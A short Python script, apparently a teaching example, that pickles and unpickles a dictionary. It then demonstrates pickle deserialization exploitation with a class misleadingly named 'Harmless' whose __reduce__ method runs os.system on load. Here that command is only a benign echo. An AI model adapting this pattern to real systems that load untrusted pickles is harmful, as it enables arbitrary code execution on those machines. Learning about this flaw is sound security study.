#!/usr/bin/env python3
import os
import pickle

data = {'name':'john','age':30,'city':'new york'}

with open('data.pkl','wb') as file:
	pickle.dump(data,file)

print("Object have been pickled and saved!")

# deserialization

with open('data.pkl','rb') as file:
	loaded_data = pickle.load(file)

print("Object has been deserialized :")
print(loaded_data)

# example of exploiting pickle

# Define a malicious class that executes arbitrary code on unpickling
class Harmless:
	def __reduce__(self):
        	# This method is called during unpickling
		return (os.system, ("echo 'Malicious code executed!'",))

harmless_object = Harmless()

with open('harmless.pkl', 'wb') as f:
	pickle.dump(harmless_object, f)

print("Harmless object has been pickled.")


with open('harmless.pkl','rb') as f:
	loaded_data = pickle.load(f)

print(loaded_data)

